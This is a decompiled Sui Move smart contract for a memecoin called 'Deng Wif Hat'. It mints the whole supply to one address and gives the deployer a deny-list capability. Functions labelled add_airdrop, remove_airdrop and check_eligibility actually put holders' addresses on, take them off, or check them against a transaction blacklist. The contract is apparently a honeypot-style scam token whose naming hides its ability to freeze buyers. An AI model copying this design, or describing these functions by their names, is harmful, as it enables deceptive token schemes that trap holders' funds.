module 0xee6492be7b997987e91805e182111ae6cdfd7d15278481d5dc04e093a6069f5d::dwifh {
    struct DWIFH has drop {
        dummy_field: bool,
    }

    public fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DWIFH>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<DWIFH>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun check_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    fun init(arg0: DWIFH, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DWIFH>(arg0, 9, b"DWIFH", b"Deng Wif Hat", b"just a viral lil hippo", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/QmT35bTaYRVn2ap8ogTrGhCqcueos399v7b9aqBeT7JcvA"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DWIFH>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DWIFH>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<DWIFH>(&mut v3, 1000000000000000000, @0xaf2b6f8da676a6120166ce217e88f86c14853ad6f73f25ec7b0f711a8369ef79, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DWIFH>>(v3);
    }

    public fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DWIFH>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<DWIFH>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

